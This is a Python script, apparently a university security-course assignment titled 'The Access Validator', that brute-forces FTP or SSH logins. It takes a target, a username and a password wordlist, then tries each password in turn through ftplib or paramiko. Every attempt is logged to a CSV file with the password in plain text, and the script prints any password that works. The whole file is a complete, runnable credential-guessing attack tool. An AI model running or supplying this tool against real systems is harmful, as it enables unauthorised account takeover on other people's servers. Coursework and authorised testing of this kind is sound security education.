"""
================================================================================
COM5413 — The Benji Protocol
Task 3: The Access Validator
File:   brute.py
================================================================================
"""

import argparse
import csv
import ftplib
import socket
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

# Try importing paramiko (required for SSH)
# If not installed, fail cleanly instead of crashing
try:
    import paramiko
except ImportError:
    print("[-] ERROR: paramiko is not installed.", file=sys.stderr)
    sys.exit(1)


# Custom error to separate network/service issues from wrong passwords
class ServiceUnavailableError(Exception):
    """Raised when the target service cannot be reached."""

    pass


# Validate port input early (before script runs fully)
def valid_port(value: str) -> int:
    """
    Ensure port is within valid range (1–65535).
    """
    try:
        port = int(value)
    except ValueError as error:
        raise argparse.ArgumentTypeError("Port must be a number.") from error

    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError("Port must be between 1 and 65535.")

    return port


# Verify that the serice is running before attempting brute force
def verify_service_alive(target: str, port: int) -> None:
    """
    Confirm the target service is reachable before brute forcing.
    Raises ServiceUnavailableError if the service cannot be reached.
    """
    try:
        with socket.create_connection((target, port), timeout=5):
            return
    except OSError as error:
        raise ServiceUnavailableError(
            f"Service unavailable on {target}:{port}"
        ) from error


def parse_arguments():
    """
    Parse CLI arguments using argparse (no input()).
    """
    parser = argparse.ArgumentParser(
        description="Targeted credential testing tool for FTP and SSH."
    )

    parser.add_argument("--target", help="Target IP address or hostname")

    parser.add_argument(
        "--service",
        choices=["ftp", "ssh"],
        required=True,
        help="Service to test: ftp or ssh",
    )

    parser.add_argument("--user", required=True, help="Username to test")

    parser.add_argument(
        "--wordlist",
        type=Path,
        required=True,
        help="Path to password wordlist",
    )

    # Use our validator here instead of plain int
    parser.add_argument(
        "--port",
        type=valid_port,
        default=None,
        help="Optional port override (default: 21 FTP / 22 SSH)",
    )

    # Default log file (pytest will use this automatically)
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("attempt_log.csv"),
        help="CSV log output path",
    )
    # Show each attempt while its running live
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Show each password attempt while running",
    )

    return parser.parse_args()


def load_wordlist(wordlist_path: Path) -> list[str]:
    """
    Load and clean passwords from file.
    Removes empty lines and handles messy/non-ASCII input.
    """
    if not wordlist_path.exists():
        raise FileNotFoundError(f"Wordlist not found: {wordlist_path}")

    # errors="ignore" prevents crashes on weird characters
    with wordlist_path.open("r", encoding="utf-8", errors="ignore") as file:
        return [line.strip() for line in file if line.strip()]


def log_attempt(output_path: Path, user: str, password: str, result: str) -> None:
    """
    Log each attempt to CSV (evidence trail).
    Creates file if it doesn't exist.
    """
    write_header = not output_path.exists() or output_path.stat().st_size == 0

    try:
        with output_path.open("a", encoding="utf-8", newline="") as file:
            writer = csv.writer(file)

            # Write header only once
            if write_header:
                writer.writerow(["timestamp", "username", "password", "result"])

            writer.writerow(
                [
                    datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
                    user,
                    password,
                    result,
                ]
            )

    except OSError as error:
        print(f"[-] ERROR: Could not write to log file: {error}", file=sys.stderr)
        sys.exit(1)


def attempt_ftp(target: str, port: int, user: str, password: str) -> bool:
    """
    Try FTP login.
    True = success
    False = wrong credentials
    Raises error if service unreachable
    """
    ftp = ftplib.FTP()

    try:
        ftp.connect(host=target, port=port, timeout=5)
        ftp.login(user=user, passwd=password)
        ftp.quit()
        return True

    # Wrong username/password
    except ftplib.error_perm:
        return False

    # Real network issue (server down, port closed, timeout)
    except (ConnectionRefusedError, TimeoutError, OSError) as error:
        raise ServiceUnavailableError(
            f"FTP service unavailable on {target}:{port}"
        ) from error

    finally:
        try:
            ftp.close()
        except Exception:
            pass


def attempt_ssh(target: str, port: int, user: str, password: str) -> bool:
    """
    Try SSH login.
    True = success
    False = wrong credentials
    Raises error if service unreachable
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=target,
            port=port,
            username=user,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=5,
            banner_timeout=5,
            auth_timeout=5,
        )
        return True

    # Wrong credentials
    except paramiko.AuthenticationException:
        return False

    # SSH server/network issues
    except (paramiko.SSHException, socket.error, OSError) as error:
        raise ServiceUnavailableError(
            f"SSH service unavailable on {target}:{port}"
        ) from error

    finally:
        client.close()


def main():
    try:
        args = parse_arguments()

        # Decide default port based on service
        port = (
            args.port
            if args.port is not None
            else (21 if args.service == "ftp" else 22)
        )

        # Load passwords
        try:
            passwords = load_wordlist(args.wordlist)
        except FileNotFoundError as error:
            print(f"[-] ERROR: {error}", file=sys.stderr)
            sys.exit(1)

        # Handle empty file after cleaning
        if not passwords:
            print("[-] ERROR: Wordlist is empty after cleaning.", file=sys.stderr)
            sys.exit(1)

        # Choose correct function dynamically
        attempt_function = attempt_ftp if args.service == "ftp" else attempt_ssh

        # Verify target is reachable BEFORE brute forcing
        try:
            verify_service_alive(args.target, port)
        except ServiceUnavailableError as error:
            print(f"[-] ERROR: {error}", file=sys.stderr)
            sys.exit(1)

        # Initialize attempt counter
        attempt_count = 0

        # Main brute loop
        for password in passwords:

            attempt_count += 1  # Count each attempt

            try:
                success = attempt_function(
                    args.target,
                    port,
                    args.user,
                    password,
                )

            except ServiceUnavailableError as error:
                print(f"[-] ERROR: {error}", file=sys.stderr)
                sys.exit(1)

            # Log every attempt
            log_attempt(
                args.output,
                args.user,
                password,
                "SUCCESS" if success else "FAIL",
            )

            # Stop immediately on success
            if success:
                print(f"[+] SUCCESS: Password found: {password}")
                return

            # Mandatory delay
            time.sleep(0.1)

        # If loop finishes with no success
        print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")

    except KeyboardInterrupt:
        print("\n[-] INTERRUPTED: Execution stopped by user.", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
